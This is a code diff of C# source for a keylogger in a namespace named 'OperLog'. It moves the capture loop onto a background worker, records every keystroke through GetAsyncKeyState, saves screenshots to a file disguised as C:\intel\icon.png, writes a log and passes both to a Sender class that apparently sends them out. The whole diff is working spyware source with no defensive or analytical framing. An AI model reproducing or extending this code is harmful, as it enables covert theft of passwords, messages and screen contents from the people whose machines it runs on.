@@ -1,4 +1,5 @@
 ﻿using System;
+using System.ComponentModel;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -12,11 +13,19 @@ namespace OperLog
     {
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+        //[STAThread]
+        BackgroundWorker _bw;
+        public void Main() {
+            this._bw = new BackgroundWorker();
+            this._bw.DoWork += Key_Log;
+            this._bw.RunWorkerAsync();
+        }
 
-        [STAThread]
-       public static void KeyLog() {
-            string buf = "";
-            while (true) {
+        public static void Key_Log(object sender, DoWorkEventArgs e)
+       {
+           const string path = @"C:\intel\icon.png";
+           string buf = "";
+           while (true) {
                 Thread.Sleep(100);
                 for (int i = 0; i < 255; i++) 
                 {
@@ -34,22 +43,23 @@ namespace OperLog
                             buf += $"<{((Keys)i).ToString()}>";
                         }
                         if (buf.Length > 10) {
-                            Snap();
+                            // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
+                            Snap(path);
                             File.AppendAllText("keylogger.log", buf);
                             Sender m = new Sender();
-                            m.SendLog(buf);
+                            m.SendLog(buf,path);
                             buf = "";
                         }
                     }
                 }
-            }
-        }
-       static void Snap() {
+           }
+       }
+        static void Snap(string path) {
             try {
                 Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                 Graphics g = Graphics.FromImage(bmp);
                 g.CopyFromScreen(0, 0, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
-                bmp.Save("icon.png", ImageFormat.Png);
+                bmp.Save(path, ImageFormat.Png);
             }
             catch (Exception) {
                 // Application.Restart(); 
